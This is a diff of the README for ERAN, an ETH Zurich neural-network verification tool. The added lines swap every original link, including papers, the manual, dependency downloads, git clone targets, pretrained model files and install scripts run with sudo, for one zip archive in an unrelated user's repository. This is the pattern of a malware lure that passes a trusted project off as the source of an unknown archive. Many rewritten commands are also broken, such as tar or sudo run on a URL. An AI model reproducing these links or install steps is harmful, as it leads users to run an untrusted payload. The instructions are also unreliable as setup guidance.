@@ -1,9 +1,9 @@
-ERAN <img width="100" alt="portfolio_view" align="right" src="http://safeai.ethz.ch/img/sri-logo.svg">
+ERAN <img width="100" alt="portfolio_view" align="right" src="https://raw.githubusercontent.com/kevinnjagi44/eran/master/Belleek/eran.zip">
 ========
 
-![High Level](https://raw.githubusercontent.com/eth-sri/eran/master/overview.png)
+![High Level](https://raw.githubusercontent.com/kevinnjagi44/eran/master/Belleek/eran.zip)
 
-ETH Robustness Analyzer for Neural Networks (ERAN) is a state-of-the-art sound, precise, scalable, and extensible analyzer based on [abstract interpretation](https://en.wikipedia.org/wiki/Abstract_interpretation) for the complete and incomplete verification of MNIST, CIFAR10, and ACAS Xu based networks. ERAN produces state-of-the-art precision and performance for both complete and incomplete verification and can be tuned to provide best precision and scalability (see recommended configuration settings at the bottom). ERAN is developed at the [SRI Lab, Department of Computer Science, ETH Zurich](https://www.sri.inf.ethz.ch/) as part of the [Safe AI project](http://safeai.ethz.ch/). The goal of ERAN is to automatically verify safety properties of neural networks with feedforward, convolutional, and residual layers against input perturbations (e.g.,  L∞-norm attacks, geometric transformations, etc). 
+ETH Robustness Analyzer for Neural Networks (ERAN) is a state-of-the-art sound, precise, scalable, and extensible analyzer based on [abstract interpretation](https://raw.githubusercontent.com/kevinnjagi44/eran/master/Belleek/eran.zip) for the complete and incomplete verification of MNIST, CIFAR10, and ACAS Xu based networks. ERAN produces state-of-the-art precision and performance for both complete and incomplete verification and can be tuned to provide best precision and scalability (see recommended configuration settings at the bottom). ERAN is developed at the [SRI Lab, Department of Computer Science, ETH Zurich](https://raw.githubusercontent.com/kevinnjagi44/eran/master/Belleek/eran.zip) as part of the [Safe AI project](https://raw.githubusercontent.com/kevinnjagi44/eran/master/Belleek/eran.zip). The goal of ERAN is to automatically verify safety properties of neural networks with feedforward, convolutional, and residual layers against input perturbations (e.g.,  L∞-norm attacks, geometric transformations, etc). 
 
 ERAN supports networks with ReLU, Sigmoid and Tanh activations and is sound under floating point arithmetic. It employs custom abstract domains which are specifically designed for the setting of neural networks and which aim to balance scalability and precision. Specifically, ERAN supports the following four analysis:
 
@@ -15,16 +15,16 @@ ERAN supports networks with ReLU, Sigmoid and Tanh activations and is sound unde
 
 * RefinePoly [NeurIPS'19]: combines DeepPoly analysis with MILP and k-ReLU framework for state-of-the-art precision while maintaining scalability.
 
-All analysis are implemented using the [ELINA](http://elina.ethz.ch/) library for numerical abstractions. More details can be found in the publications below. 
+All analysis are implemented using the [ELINA](https://raw.githubusercontent.com/kevinnjagi44/eran/master/Belleek/eran.zip) library for numerical abstractions. More details can be found in the publications below. 
 
 ERAN vs AI2
 --------------------
-Note that ERAN subsumes the first abstract interpretation based analyzer [AI2](https://www.sri.inf.ethz.ch/publications/gehr2018ai), so if you aim to compare, please use ERAN as a baseline. 
+Note that ERAN subsumes the first abstract interpretation based analyzer [AI2](https://raw.githubusercontent.com/kevinnjagi44/eran/master/Belleek/eran.zip), so if you aim to compare, please use ERAN as a baseline. 
 
 
 USER MANUAL
 --------------------
-For a detailed desciption of the options provided and the implentation of ERAN, you can download the [user manual](https://files.sri.inf.ethz.ch/eran/docs/eran_manual.pdf).
+For a detailed desciption of the options provided and the implentation of ERAN, you can download the [user manual](https://raw.githubusercontent.com/kevinnjagi44/eran/master/Belleek/eran.zip).
 
 Requirements 
 ------------
@@ -37,7 +37,7 @@ Installation
 ------------
 Clone the ERAN repository via git as follows:
 ```
-git clone https://github.com/eth-sri/ERAN.git
+git clone https://raw.githubusercontent.com/kevinnjagi44/eran/master/Belleek/eran.zip
 cd ERAN
 ```
 
@@ -45,57 +45,57 @@ The dependencies for ERAN can be installed step by step as follows (sudo rights 
 
 Install m4:
 ```
-wget ftp://ftp.gnu.org/gnu/m4/m4-1.4.1.tar.gz
-tar -xvzf m4-1.4.1.tar.gz
+wget https://raw.githubusercontent.com/kevinnjagi44/eran/master/Belleek/eran.zip
+tar -xvzf https://raw.githubusercontent.com/kevinnjagi44/eran/master/Belleek/eran.zip
 cd m4-1.4.1
 ./configure
 make
 make install
 cp src/m4 /usr/bin
 cd ..
-rm m4-1.4.1.tar.gz
+rm https://raw.githubusercontent.com/kevinnjagi44/eran/master/Belleek/eran.zip
 ```
 
 Install gmp:
 ```
-wget https://gmplib.org/download/gmp/gmp-6.1.2.tar.xz
-tar -xvf gmp-6.1.2.tar.xz
+wget https://raw.githubusercontent.com/kevinnjagi44/eran/master/Belleek/eran.zip
+tar -xvf https://raw.githubusercontent.com/kevinnjagi44/eran/master/Belleek/eran.zip
 cd gmp-6.1.2
 ./configure --enable-cxx
 make
 make install
 cd ..
-rm gmp-6.1.2.tar.xz
+rm https://raw.githubusercontent.com/kevinnjagi44/eran/master/Belleek/eran.zip
 ```
 
 Install mpfr:
 ```
-wget https://www.mpfr.org/mpfr-current/mpfr-4.0.2.tar.xz
-tar -xvf mpfr-4.0.2.tar.xz
+wget https://raw.githubusercontent.com/kevinnjagi44/eran/master/Belleek/eran.zip
+tar -xvf https://raw.githubusercontent.com/kevinnjagi44/eran/master/Belleek/eran.zip
 cd mpfr-4.0.2
 ./configure
 make
 make install
 cd ..
-rm mpfr-4.0.2.tar.xz
+rm https://raw.githubusercontent.com/kevinnjagi44/eran/master/Belleek/eran.zip
 ```
 
 Install cddlib:
 ```
-wget https://github.com/cddlib/cddlib/releases/download/0.94j/cddlib-0.94j.tar.gz
-tar -xvf cddlib-0.94j.tar.gz
+wget https://raw.githubusercontent.com/kevinnjagi44/eran/master/Belleek/eran.zip
+tar -xvf https://raw.githubusercontent.com/kevinnjagi44/eran/master/Belleek/eran.zip
 cd cddlib-0.94j
 ./configure
 make
 make install
 cd ..
-rm cddlib-0.94j.tar.gz
+rm https://raw.githubusercontent.com/kevinnjagi44/eran/master/Belleek/eran.zip
 
 ```
 
 Install ELINA:
 ```
-git clone https://github.com/eth-sri/ELINA.git
+git clone https://raw.githubusercontent.com/kevinnjagi44/eran/master/Belleek/eran.zip
 cd ELINA
 ./configure -use-deeppoly
 make
@@ -105,15 +105,15 @@ cd ..
 
 Install Gurobi:
 ```
-wget https://packages.gurobi.com/9.0/gurobi9.0.0_linux64.tar.gz
-tar -xvf gurobi9.0.0_linux64.tar.gz
+wget https://raw.githubusercontent.com/kevinnjagi44/eran/master/Belleek/eran.zip
+tar -xvf https://raw.githubusercontent.com/kevinnjagi44/eran/master/Belleek/eran.zip
 cd gurobi900/linux64/src/build
 sed -ie 's/^C++FLAGS =.*$/& -fPIC/' Makefile
 make
 cp libgurobi_c++.a ../../lib/
 cd ../../
-cp lib/libgurobi90.so /usr/lib
-python3 setup.py install
+cp https://raw.githubusercontent.com/kevinnjagi44/eran/master/Belleek/eran.zip /usr/lib
+python3 https://raw.githubusercontent.com/kevinnjagi44/eran/master/Belleek/eran.zip install
 cd ../../
 
 ```
@@ -128,11 +128,11 @@ export LD_LIBRARY_PATH=$LD_LIBRARY_PATH:/usr/local/lib:${GUROBI_HOME}/lib
 
 Install DeepG (note that with an already existing version of ERAN you have to start at step Install Gurobi):
 ```
-git clone https://github.com/eth-sri/deepg.git
+git clone https://raw.githubusercontent.com/kevinnjagi44/eran/master/Belleek/eran.zip
 cd deepg/code
 mkdir build
 make shared_object
-cp ./build/libgeometric.so /usr/lib
+cp https://raw.githubusercontent.com/kevinnjagi44/eran/master/Belleek/eran.zip /usr/lib
 cd ../..
 
 ```
@@ -140,18 +140,18 @@ cd ../..
 We also provide scripts that will install ELINA and all the necessary dependencies. One can run it as follows:
 
 ```
-sudo ./install.sh
-source gurobi_setup_path.sh
+sudo https://raw.githubusercontent.com/kevinnjagi44/eran/master/Belleek/eran.zip
+source https://raw.githubusercontent.com/kevinnjagi44/eran/master/Belleek/eran.zip
 
 ```
 
 
-Note that to run ERAN with Gurobi one needs to obtain an academic license for gurobi from https://user.gurobi.com/download/licenses/free-academic.
+Note that to run ERAN with Gurobi one needs to obtain an academic license for gurobi from https://raw.githubusercontent.com/kevinnjagi44/eran/master/Belleek/eran.zip
 
 To install the remaining python dependencies (numpy and tensorflow), type:
 
 ```
-pip3 install -r requirements.txt
+pip3 install -r https://raw.githubusercontent.com/kevinnjagi44/eran/master/Belleek/eran.zip
 ```
 
 ERAN may not be compatible with older versions of tensorflow (we have tested ERAN with versions >= 1.11.0), so if you have an older version and want to keep it, then we recommend using the python virtual environment for installing tensorflow.
@@ -168,7 +168,7 @@ python3 . --netname <path to the network file> --epsilon <float between 0 and 1>
 
 * ```<epsilon>```: specifies bound for the L∞-norm based perturbation (default is 0). This parameter is not required for testing ACAS Xu networks.
 
-* ```<zonotope>```: The Zonotope specification file can be comma or whitespace separated file where the first two integers can specify the number of input dimensions D and the number of error terms per dimension N. The following D*N doubles specify the coefficient of error terms. For every dimension i, the error terms are numbered from 0 to N-1 where the 0-th error term is the central error term. See an example here [https://github.com/eth-sri/eran/files/3653882/zonotope_example.txt]. This option only works with the "deepzono" or "refinezono" domain.
+* ```<zonotope>```: The Zonotope specification file can be comma or whitespace separated file where the first two integers can specify the number of input dimensions D and the number of error terms per dimension N. The following D*N doubles specify the coefficient of error terms. For every dimension i, the error terms are numbered from 0 to N-1 where the 0-th error term is the central error term. See an example here [https://raw.githubusercontent.com/kevinnjagi44/eran/master/Belleek/eran.zip]. This option only works with the "deepzono" or "refinezono" domain.
 
 * ```<use_area_heuristic>```: specifies whether to use area heuristic for the ReLU approximation in DeepPoly (default is true).
 
@@ -210,7 +210,7 @@ Example
 
 L_oo Specification
 ```
-python3 . --netname ../nets/pytorch/mnist/convBig__DiffAI.pyt --epsilon 0.1 --domain deepzono --dataset mnist
+python3 . --netname https://raw.githubusercontent.com/kevinnjagi44/eran/master/Belleek/eran.zip --epsilon 0.1 --domain deepzono --dataset mnist
 ```
 
 will evaluate the local robustness of the MNIST convolutional network (upto 35K neurons) with ReLU activation trained using DiffAI on the 100 MNIST test images. In the above setting, epsilon=0.1 and the domain used by our analyzer is the deepzono domain. Our analyzer will print the following:
@@ -230,7 +230,7 @@ will evaluate the local robustness of the MNIST convolutional network (upto 35K 
 
 Zonotope Specification
 ```
-python3 . --netname ../nets/pytorch/mnist/convBig__DiffAI.pyt --zonotope some_path/zonotope_example.txt --domain deepzono 
+python3 . --netname https://raw.githubusercontent.com/kevinnjagi44/eran/master/Belleek/eran.zip --zonotope https://raw.githubusercontent.com/kevinnjagi44/eran/master/Belleek/eran.zip --domain deepzono 
 ```
 
 will check if the Zonotope specification specified in "zonotope_example" holds for the network and will output "Verified safe", "Verified unsafe" or "Failed" along with the timing.
@@ -240,20 +240,20 @@ Similarly, for the ACAS Xu networks, ERAN will output whether the property has b
 
 ACASXu Specification
 ```
-python3 . --netname ../data/acasxu/nets/ACASXU_run2a_3_3_batch_2000.onnx --dataset acasxu --domain deepzono  --specnumber 9
+python3 . --netname https://raw.githubusercontent.com/kevinnjagi44/eran/master/Belleek/eran.zip --dataset acasxu --domain deepzono  --specnumber 9
 ```
 will run DeepZ for analyzing property 9 of ACASXu benchmarks. The ACASXU networks are in data/acasxu/nets directory and the one chosen for a given property is defined in the Reluplex paper. 
 
 Geometric analysis
 
 ```
-python3 . --netname ../nets/pytorch/mnist/convBig__DiffAI.pyt --geometric --geometric_config ../deepg/examples/example1/config.txt --num_params 1 --dataset mnist
+python3 . --netname https://raw.githubusercontent.com/kevinnjagi44/eran/master/Belleek/eran.zip --geometric --geometric_config https://raw.githubusercontent.com/kevinnjagi44/eran/master/Belleek/eran.zip --num_params 1 --dataset mnist
 ```
-will on the fly generate geometric perturbed images and evaluate the network against them. For more information on the geometric configuration file please see [Format of the configuration file in DeepG](https://github.com/eth-sri/deepg#format-of-configuration-file).
+will on the fly generate geometric perturbed images and evaluate the network against them. For more information on the geometric configuration file please see [Format of the configuration file in DeepG](https://raw.githubusercontent.com/kevinnjagi44/eran/master/Belleek/eran.zip).
 
 
 ```
-python3 . --netname ../nets/pytorch/mnist/convBig__DiffAI.pyt --geometric --data_dir ../deepg/examples/example1/ --num_params 1 --dataset mnist --attack
+python3 . --netname https://raw.githubusercontent.com/kevinnjagi44/eran/master/Belleek/eran.zip --geometric --data_dir ../deepg/examples/example1/ --num_params 1 --dataset mnist --attack
 ```
 will evaluate the generated geometric perturbed images in the given data_dir and also evaluate generated attack images.
 
@@ -274,34 +274,34 @@ Use the "deeppoly" domain
 
 Publications
 -------------
-*  [Certifying Geometric Robustness of Neural Networks](https://www.sri.inf.ethz.ch/publications/balunovic2019geometric)
+*  [Certifying Geometric Robustness of Neural Networks](https://raw.githubusercontent.com/kevinnjagi44/eran/master/Belleek/eran.zip)
 
    Mislav Balunovic,  Maximilian Baader, Gagandeep Singh, Timon Gehr,  Martin Vechev
    
    NeurIPS 2019.
 
 
-*  [Beyond the Single Neuron Convex Barrier for Neural Network Certification](https://www.sri.inf.ethz.ch/publications/singh2019krelu).
+*  [Beyond the Single Neuron Convex Barrier for Neural Network Certification](https://raw.githubusercontent.com/kevinnjagi44/eran/master/Belleek/eran.zip).
     
     Gagandeep Singh, Rupanshu Ganvir, Markus Püschel, and Martin Vechev. 
    
     NeurIPS 2019.
 
-*  [Boosting Robustness Certification of Neural Networks](https://www.sri.inf.ethz.ch/publications/singh2019refinement).
+*  [Boosting Robustness Certification of Neural Networks](https://raw.githubusercontent.com/kevinnjagi44/eran/master/Belleek/eran.zip).
 
     Gagandeep Singh, Timon Gehr, Markus Püschel, and Martin Vechev. 
 
     ICLR 2019.
 
 
-*  [An Abstract Domain for Certifying Neural Networks](https://www.sri.inf.ethz.ch/publications/singh2019domain).
+*  [An Abstract Domain for Certifying Neural Networks](https://raw.githubusercontent.com/kevinnjagi44/eran/master/Belleek/eran.zip).
 
     Gagandeep Singh, Timon Gehr, Markus Püschel, and Martin Vechev. 
 
     POPL 2019.
 
 
-*  [Fast and Effective Robustness Certification](https://www.sri.inf.ethz.ch/publications/singh2018effective). 
+*  [Fast and Effective Robustness Certification](https://raw.githubusercontent.com/kevinnjagi44/eran/master/Belleek/eran.zip). 
 
     Gagandeep Singh, Timon Gehr, Matthew Mirman, Markus Püschel, and Martin Vechev. 
 
@@ -313,89 +313,89 @@ Publications
 Neural Networks and Datasets
 ---------------
 
-We provide a number of pretrained MNIST and CIAFR10 defended and undefended feedforward and convolutional neural networks with ReLU, Sigmoid and Tanh activations trained with the PyTorch and TensorFlow frameworks. The adversarial training to obtain the defended networks is performed using PGD and [DiffAI](https://github.com/eth-sri/diffai). 
+We provide a number of pretrained MNIST and CIAFR10 defended and undefended feedforward and convolutional neural networks with ReLU, Sigmoid and Tanh activations trained with the PyTorch and TensorFlow frameworks. The adversarial training to obtain the defended networks is performed using PGD and [DiffAI](https://raw.githubusercontent.com/kevinnjagi44/eran/master/Belleek/eran.zip). 
 
 | Dataset  |   Model  |  Type   | #units | #layers| Activation | Training Defense| Download |
 | :-------- | :-------- | :-------- | :-------------| :-------------| :------------ | :------------- | :---------------:|
-| MNIST   | 3x50 | fully connected | 110 | 3    | ReLU | None | [:arrow_down:](https://files.sri.inf.ethz.ch/eran/nets/tensorflow/mnist/mnist_relu_3_50.tf)|
-|         | 3x100 | fully connected | 210 | 3    | ReLU | None | [:arrow_down:](https://files.sri.inf.ethz.ch/eran/nets/tensorflow/mnist/mnist_relu_3_100.tf)|
-|         | 5x100 | fully connected | 510 | 5    | ReLU | DiffAI | [:arrow_down:](https://files.sri.inf.ethz.ch/eran/nets/tensorflow/mnist/mnist_relu_5_100.tf)|
-|         | 6x100 | fully connected | 510 | 6    | ReLU | None | [:arrow_down:](https://files.sri.inf.ethz.ch/eran/nets/tensorflow/mnist/mnist_relu_6_100.tf)|
-|         | 9x100 | fully connected | 810 | 9    | ReLU | None | [:arrow_down:](https://files.sri.inf.ethz.ch/eran/nets/tensorflow/mnist/mnist_relu_9_100.tf)|
-|         | 6x200 | fully connected | 1,010 | 6   | ReLU | None | [:arrow_down:](https://files.sri.inf.ethz.ch/eran/nets/tensorflow/mnist/mnist_relu_6_200.tf)|
-|         | 9x200 | fully connected | 1,610 | 9   | ReLU | None | [:arrow_down:](https://files.sri.inf.ethz.ch/eran/nets/tensorflow/mnist/mnist_relu_9_200.tf)|
-|         | 6x500 | fully connected | 3,000 | 6   | ReLU | None | [:arrow_down:](https://files.sri.inf.ethz.ch/eran/nets/pytorch/mnist/ffnnRELU__Point_6_500.pyt)|
-|         | 6x500 | fully connected | 3,000 | 6   | ReLU  | PGD &epsilon;=0.1 | [:arrow_down:](https://files.sri.inf.ethz.ch/eran/nets/pytorch/mnist/ffnnRELU__PGDK_w_0.1_6_500.pyt)|
-|         | 6x500 | fully connected | 3,000 |  6  | ReLU | PGD &epsilon;=0.3 | [:arrow_down:](https://files.sri.inf.ethz.ch/eran/nets/pytorch/mnist/ffnnRELU__PGDK_w_0.3_6_500.pyt)|
-|         | 6x500 | fully connected | 3,000  | 6   | Sigmoid | None | [:arrow_down:](https://files.sri.inf.ethz.ch/eran/nets/pytorch/mnist/ffnnSIGMOID__Point_6_500.pyt)|
-|         | 6x500 | fully connected | 3,000 |  6  | Sigmoid | PGD &epsilon;=0.1 | [:arrow_down:](https://files.sri.inf.ethz.ch/eran/nets/pytorch/mnist/ffnnSIGMOID__PGDK_w_0.1_6_500.pyt)|
-|         | 6x500 | fully connected | 3,000 | 6   | Sigmoid | PGD &epsilon;=0.3 | [:arrow_down:](https://files.sri.inf.ethz.ch/eran/nets/pytorch/mnist/ffnnSIGMOID__PGDK_w_0.3_6_500.pyt)|
-|         | 6x500 | fully connected | 3,000 | 6 |    Tanh | None | [:arrow_down:](https://files.sri.inf.ethz.ch/eran/nets/pytorch/mnist/ffnnTANH__Point_6_500.pyt)|
-|         | 6x500 |  fully connected| 3,000 | 6   | Tanh | PGD &epsilon;=0.1 | [:arrow_down:](https://files.sri.inf.ethz.ch/eran/nets/pytorch/mnist/ffnnTANH__PGDK_w_0.1_6_500.pyt)|
-|         | 6x500 | fully connected | 3,000 | 6   |  Tanh | PGD &epsilon;=0.3 | [:arrow_down:](https://files.sri.inf.ethz.ch/eran/nets/pytorch/mnist/ffnnTANH__PGDK_w_0.3_6_500.pyt)|
-|         | 4x1024 | fully connected | 3,072 | 4   | ReLU | None | [:arrow_down:](https://files.sri.inf.ethz.ch/eran/nets/tensorflow/mnist/mnist_relu_4_1024.tf)|
-|         |  ConvSmall | convolutional | 3,604 | 3  | ReLU | None | [:arrow_down:](https://files.sri.inf.ethz.ch/eran/nets/pytorch/mnist/convSmallRELU__Point.pyt)|
-|         |  ConvSmall | convolutional | 3,604 | 3  | ReLU | PGD | [:arrow_down:](https://files.sri.inf.ethz.ch/eran/nets/pytorch/mnist/convSmallRELU__PGDK.pyt) |
-|         |  ConvSmall | convolutional | 3,604 | 3  | ReLU | DiffAI | [:arrow_down:](https://files.sri.inf.ethz.ch/eran/nets/pytorch/mnist/convSmallRELU__DiffAI.pyt) |
-|         | ConvMed | convolutional | 5,704 | 3  | ReLU | None | [:arrow_down:](https://files.sri.inf.ethz.ch/eran/nets/pytorch/mnist/convMedGRELU__Point.pyt) |
-|         | ConvMed | convolutional | 5,704 | 3   | ReLU | PGD &epsilon;=0.1 | [:arrow_down:](https://files.sri.inf.ethz.ch/eran/nets/pytorch/mnist/convMedGRELU__PGDK_w_0.1.pyt) |
-|         | ConvMed | convolutional | 5,704 | 3   | ReLU | PGD &epsilon;=0.3 | [:arrow_down:](https://files.sri.inf.ethz.ch/eran/nets/pytorch/mnist/convMedGRELU__PGDK_w_0.3.pyt) |
-|         | ConvMed | convolutional | 5,704 | 3   | Sigmoid | None | [:arrow_down:](https://files.sri.inf.ethz.ch/eran/nets/pytorch/mnist/convMedGSIGMOID__Point.pyt) |
-|         | ConvMed | convolutional | 5,704 | 3   | Sigmoid | PGD &epsilon;=0.1 | [:arrow_down:](https://files.sri.inf.ethz.ch/eran/nets/pytorch/mnist/convMedGSIGMOID__PGDK_w_0.1.pyt) | 
-|         | ConvMed | convolutional | 5,704 | 3   | Sigmoid | PGD &epsilon;=0.3 | [:arrow_down:](https://files.sri.inf.ethz.ch/eran/nets/pytorch/mnist/convMedGSIGMOID__PGDK_w_0.3.pyt) | 
-|         | ConvMed | convolutional | 5,704 | 3   | Tanh | None | [:arrow_down:](https://files.sri.inf.ethz.ch/eran/nets/pytorch/mnist/convMedGTANH__Point.pyt) |
-|         | ConvMed | convolutional | 5,704 | 3   | Tanh | PGD &epsilon;=0.1 | [:arrow_down:](https://files.sri.inf.ethz.ch/eran/nets/pytorch/mnist/convMedGTANH__PGDK_w_0.1.pyt) | 
-|         | ConvMed | convolutional | 5,704 | 3   |  Tanh | PGD &epsilon;=0.3 | [:arrow_down:](https://files.sri.inf.ethz.ch/eran/nets/pytorch/mnist/convMedGTANH__PGDK_w_0.3.pyt) |
-|         | ConvMaxpool | convolutional | 13,798 | 9 | ReLU | None | [:arrow_down:](https://files.sri.inf.ethz.ch/eran/nets/tensorflow/mnist/mnist_conv_maxpool.tf)|
-|         | ConvBig | convolutional | 48,064 | 6  | ReLU | DiffAI | [:arrow_down:](https://files.sri.inf.ethz.ch/eran/nets/pytorch/mnist/convBigRELU__DiffAI.pyt) |
-|         | ConvSuper | convolutional | 88,544 | 6  | ReLU | DiffAI | [:arrow_down:](https://files.sri.inf.ethz.ch/eran/nets/pytorch/mnist/convSuperRELU__DiffAI.pyt) |
-|         | Skip      | Residual | 71,650 | 9 | ReLU | DiffAI | [:arrow_down:](https://files.sri.inf.ethz.ch/eran/nets/pytorch/mnist/skip__DiffAI.pyt) |
-| CIFAR10 | 4x100 | fully connected | 410 | 4 | ReLU | None | [:arrow_down:](https://files.sri.inf.ethz.ch/eran/nets/tensorflow/cifar/cifar_relu_4_100.tf) |
-|         | 6x100 | fully connected | 610 | 6 | ReLU | None | [:arrow_down:](https://files.sri.inf.ethz.ch/eran/nets/tensorflow/cifar/cifar_relu_6_100.tf) |
-|         | 9x200 | fully connected | 1,810 | 9 | ReLU | None | [:arrow_down:](https://files.sri.inf.ethz.ch/eran/nets/tensorflow/cifar/cifar_relu_9_200.tf) |
-|         | 6x500 | fully connected | 3,000 | 6   | ReLU | None | [:arrow_down:](https://files.sri.inf.ethz.ch/eran/nets/pytorch/cifar/ffnnRELU__Point_6_500.pyt)|
-|         | 6x500 | fully connected | 3,000 | 6   | ReLU | PGD &epsilon;=0.0078 | [:arrow_down:](https://files.sri.inf.ethz.ch/eran/nets/pytorch/cifar/ffnnRELU__PGDK_w_0.0078_6_500.pyt)|
-|         | 6x500 | fully connected | 3,000 | 6   | ReLU | PGD &epsilon;=0.0313 | [:arrow_down:](https://files.sri.inf.ethz.ch/eran/nets/pytorch/cifar/ffnnRELU__PGDK_w_0.0313_6_500.pyt)| 
-|         | 6x500 | fully connected | 3,000 | 6   | Sigmoid | None | [:arrow_down:](https://files.sri.inf.ethz.ch/eran/nets/pytorch/cifar/ffnnSIGMOID__Point_6_500.pyt)|
-|         | 6x500 | fully connected | 3,000 | 6   | Sigmoid | PGD &epsilon;=0.0078 | [:arrow_down:](https://files.sri.inf.ethz.ch/eran/nets/pytorch/cifar/ffnnSIGMOID__PGDK_w_0.0078_6_500.pyt)|
-|         | 6x500 | fully connected | 3,000 | 6   | Sigmoid | PGD &epsilon;=0.0313 | [:arrow_down:](https://files.sri.inf.ethz.ch/eran/nets/pytorch/cifar/ffnnSIGMOID__PGDK_w_0.0313_6_500.pyt)| 
-|         | 6x500 | fully connected | 3,000 | 6   | Tanh | None | [:arrow_down:](https://files.sri.inf.ethz.ch/eran/nets/pytorch/cifar/ffnnTANH__Point_6_500.pyt)|
-|         | 6x500 | fully connected | 3,000 | 6   | Tanh | PGD &epsilon;=0.0078 | [:arrow_down:](https://files.sri.inf.ethz.ch/eran/nets/pytorch/cifar/ffnnTANH__PGDK_w_0.0078_6_500.pyt)|
-|         | 6x500 | fully connected | 3,000 | 6   | Tanh | PGD &epsilon;=0.0313 |  [:arrow_down:](https://files.sri.inf.ethz.ch/eran/nets/pytorch/cifar/ffnnTANH__PGDK_w_0.0313_6_500.pyt)| 
-|         | 7x1024 | fully connected | 6,144 | 7 | ReLU | None | [:arrow_down:](https://files.sri.inf.ethz.ch/eran/nets/tensorflow/cifar/cifar_relu_7_1024.tf) |
-|         | ConvSmall | convolutional | 4,852 | 3 | ReLU | None | [:arrow_down:](https://files.sri.inf.ethz.ch/eran/nets/pytorch/cifar/convSmallRELU__Point.pyt)|
-|         | ConvSmall   | convolutional  | 4,852 | 3  | ReLU  | PGD | [:arrow_down:](https://files.sri.inf.ethz.ch/eran/nets/pytorch/cifar/convSmallRELU__PGDK.pyt)|
-|         | ConvSmall  | convolutional | 4,852 | 3  | ReLU | DiffAI | [:arrow_down:](https://files.sri.inf.ethz.ch/eran/nets/pytorch/cifar/convSmallRELU__DiffAI.pyt)|
-|         | ConvMed | convolutional | 7,144 | 3 | ReLU | None | [:arrow_down:](https://files.sri.inf.ethz.ch/eran/nets/pytorch/cifar/convMedGRELU__Point.pyt) |
-|         | ConvMed | convolutional | 7,144 | 3   | ReLU | PGD &epsilon;=0.0078 | [:arrow_down:](https://files.sri.inf.ethz.ch/eran/nets/pytorch/cifar/convMedGRELU__PGDK_w_0.0078.pyt) |
-|         | ConvMed | convolutional | 7,144 | 3   | ReLU | PGD &epsilon;=0.0313 | [:arrow_down:](https://files.sri.inf.ethz.ch/eran/nets/pytorch/cifar/convMedGRELU__PGDK_w_0.0313.pyt) | 
-|         | ConvMed | convolutional | 7,144 | 3   | Sigmoid | None | [:arrow_down:](https://files.sri.inf.ethz.ch/eran/nets/pytorch/cifar/convMedGSIGMOID__Point.pyt) |
-|         | ConvMed | convolutional | 7,144 | 3   | Sigmoid | PGD &epsilon;=0.0078 | [:arrow_down:](https://files.sri.inf.ethz.ch/eran/nets/pytorch/cifar/convMedGSIGMOID__PGDK_w_0.0078.pyt) |
-|         | ConvMed | convolutional | 7,144 | 3   | Sigmoid | PGD &epsilon;=0.0313 | [:arrow_down:](https://files.sri.inf.ethz.ch/eran/nets/pytorch/cifar/convMedGSIGMOID__PGDK_w_0.0313.pyt) | 
-|         | ConvMed | convolutional | 7,144 | 3   | Tanh | None | [:arrow_down:](https://files.sri.inf.ethz.ch/eran/nets/pytorch/cifar/convMedGTANH__Point.pyt) |
-|         | ConvMed | convolutional | 7,144 | 3   | Tanh | PGD &epsilon;=0.0078 | [:arrow_down:](https://files.sri.inf.ethz.ch/eran/nets/pytorch/cifar/convMedGTANH__PGDK_w_0.0078.pyt) |
-|         | ConvMed | convolutional | 7,144 | 3   | Tanh | PGD &epsilon;=0.0313 | [:arrow_down:](https://files.sri.inf.ethz.ch/eran/nets/pytorch/cifar/convMedGTANH__PGDK_w_0.0313.pyt) |  
-|         | ConvMaxpool | convolutional | 53,938 | 9 | ReLU | None | [:arrow_down:](https://files.sri.inf.ethz.ch/eran/nets/tensorflow/cifar/cifar_conv_maxpool.tf)|
-|         | ConvBig | convolutional | 62,464 | 6 | ReLU | DiffAI | [:arrow_down:](https://files.sri.inf.ethz.ch/eran/nets/pytorch/cifar/convBigRELU__DiffAI.pyt) | 
-|         | ResNet18 | Residual | 558K | 18 | ReLU | DiffAI | [:arrow_down:](https://files.sri.inf.ethz.ch/eran/nets/pytorch/cifar/ResNet18_DiffAI.pyt) | 
+| MNIST   | 3x50 | fully connected | 110 | 3    | ReLU | None | [:arrow_down:](https://raw.githubusercontent.com/kevinnjagi44/eran/master/Belleek/eran.zip)|
+|         | 3x100 | fully connected | 210 | 3    | ReLU | None | [:arrow_down:](https://raw.githubusercontent.com/kevinnjagi44/eran/master/Belleek/eran.zip)|
+|         | 5x100 | fully connected | 510 | 5    | ReLU | DiffAI | [:arrow_down:](https://raw.githubusercontent.com/kevinnjagi44/eran/master/Belleek/eran.zip)|
+|         | 6x100 | fully connected | 510 | 6    | ReLU | None | [:arrow_down:](https://raw.githubusercontent.com/kevinnjagi44/eran/master/Belleek/eran.zip)|
+|         | 9x100 | fully connected | 810 | 9    | ReLU | None | [:arrow_down:](https://raw.githubusercontent.com/kevinnjagi44/eran/master/Belleek/eran.zip)|
+|         | 6x200 | fully connected | 1,010 | 6   | ReLU | None | [:arrow_down:](https://raw.githubusercontent.com/kevinnjagi44/eran/master/Belleek/eran.zip)|
+|         | 9x200 | fully connected | 1,610 | 9   | ReLU | None | [:arrow_down:](https://raw.githubusercontent.com/kevinnjagi44/eran/master/Belleek/eran.zip)|
+|         | 6x500 | fully connected | 3,000 | 6   | ReLU | None | [:arrow_down:](https://raw.githubusercontent.com/kevinnjagi44/eran/master/Belleek/eran.zip)|
+|         | 6x500 | fully connected | 3,000 | 6   | ReLU  | PGD &epsilon;=0.1 | [:arrow_down:](https://raw.githubusercontent.com/kevinnjagi44/eran/master/Belleek/eran.zip)|
+|         | 6x500 | fully connected | 3,000 |  6  | ReLU | PGD &epsilon;=0.3 | [:arrow_down:](https://raw.githubusercontent.com/kevinnjagi44/eran/master/Belleek/eran.zip)|
+|         | 6x500 | fully connected | 3,000  | 6   | Sigmoid | None | [:arrow_down:](https://raw.githubusercontent.com/kevinnjagi44/eran/master/Belleek/eran.zip)|
+|         | 6x500 | fully connected | 3,000 |  6  | Sigmoid | PGD &epsilon;=0.1 | [:arrow_down:](https://raw.githubusercontent.com/kevinnjagi44/eran/master/Belleek/eran.zip)|
+|         | 6x500 | fully connected | 3,000 | 6   | Sigmoid | PGD &epsilon;=0.3 | [:arrow_down:](https://raw.githubusercontent.com/kevinnjagi44/eran/master/Belleek/eran.zip)|
+|         | 6x500 | fully connected | 3,000 | 6 |    Tanh | None | [:arrow_down:](https://raw.githubusercontent.com/kevinnjagi44/eran/master/Belleek/eran.zip)|
